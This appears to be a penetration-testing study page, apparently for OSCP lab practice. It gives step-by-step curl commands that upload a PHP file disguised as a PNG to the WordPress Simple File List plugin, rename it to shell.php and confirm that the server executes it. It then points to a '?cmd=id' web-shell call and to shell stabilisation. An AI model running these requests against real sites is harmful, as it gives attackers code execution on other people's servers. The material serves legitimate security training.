# Web - WordPress Simple File List Upload

**Step 9A of 50 · Web**

*Test the WordPress Simple File List plugin for an upload that can later be renamed into a PHP file.*

## When to use this

Use this page when WordPress is identified and the Simple File List plugin is present or its version is unknown. The technique has two separate parts: upload a harmless PHP test file with an allowed image extension, then rename it and confirm whether the web server executes PHP. A successful upload alone is not code execution.

## Identify the plugin

> **Why:** This request checks the plugin readme and page source for the plugin version and activation clues; look for a version at or below the vulnerable range and references to Simple File List.
```bash
curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/readme.txt" | head -5
curl -s "http://$BoxIP/" | grep -i "simple-file-list"
```

## Prepare a harmless test file

> **Why:** This command creates a PHP file that only reports the web process identity; the `.png` name tests whether the upload filter checks content, extension, or both.
```bash
printf '%s\n' '<?php echo "uid="; echo getmyuid(); ?>' > $BoxDir/www/shell.png
```

## Upload the file

The plugin uses several form fields in addition to the file itself. `$Timestamp` and `$Token` must be obtained from the rendered WordPress page or the plugin request; do not copy real values into shared notes.

> **Why:** This request sends the image-named PHP test file to the plugin upload endpoint with the fields it expects; look for a success response and then verify the uploaded path.
```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
  -F "file=@$BoxDir/www/shell.png;type=image/png" \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=$Timestamp" \
  -F "eeSFL_Token=$Token"
```

> **Why:** This request checks whether the uploaded file is reachable before attempting a rename; a non-empty response or expected HTTP status proves the upload path is correct.
```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"
```

## Rename the file

The rename endpoint expects `eeFileOld`, `eeListFolder`, and a pipe between `Rename` and the new filename. The extra headers imitate the plugin’s own browser request.

> **Why:** This request changes the stored filename from an image extension to `.php`; success means the file may now be interpreted by PHP, which must be tested separately.
```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://$BoxIP/wp-admin/" \
  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
```

## Test execution

> **Why:** This request calls the renamed file and asks it to print a harmless identity marker; look for `uid=` rather than assuming that a successful rename is execution.
```bash
curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php"
```

## Example output

```text
SUCCESS
uid=33
```

## What did you get?

- [ ] The plugin is present and the upload succeeds → **Run `curl -I http://$BoxIP/$UploadPath/$Filename.png`, rename it through the documented plugin request, then run `curl -i http://$BoxIP/$UploadPath/$Filename.php`**
- [ ] The file executes and returns `uid=` → **Run `curl -s 'http://$BoxIP/$UploadPath/$Filename.php?cmd=id'`, then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The upload returns 403 or filters the file → **Treat this path as blocked, check the version and required fields once, then return to Step 5 · [[Linux - Web Enum]]**
- [ ] The plugin is not present → **Return to Step 6 · [[Linux - CMS Check]] and enumerate other plugins**
- [ ] Rename succeeds but PHP is not executed → **Check the upload directory handler and return to generic Step 9 · [[Linux - File Upload]]**

## Notes

The plugin version, token, timestamp, upload directory, and field names vary. A `200` response for the image-named file does not prove that PHP executes. Keep the test file harmless and remove it during clean-down.

## Gotcha

> [!warning] 💡
> Do not paste plugin tokens, credentials, or flag values into notes. If the endpoint returns HTTP 500, first check that all required plugin fields were supplied.

## Seen in
- *(no write-up yet)*

## Related stages

- [[Linux - Web Enum]]
- [[Linux - CMS Check]]
- [[Linux - File Upload]]

## External Resources

- [Exploit-DB 52371](https://www.exploit-db.com/exploits/52371)
- [HackTricks File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [PayloadsAllTheThings File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

## Why this matters for OSCP

WordPress plugins with unsafe upload and rename handling can turn a low-risk file upload into a web foothold. This path appeared in a PG Practice box and teaches why upload success, file reachability, and code execution must be verified separately.

## Additional routing

- [ ] PHP execution is confirmed → **Stabilise the shell at Step 12 · [[Linux - Shell Stabilise]]**
- [ ] The plugin path is blocked → **Continue with Step 9 · [[Linux - File Upload]] or return to Step 6 · [[Linux - CMS Check]]**
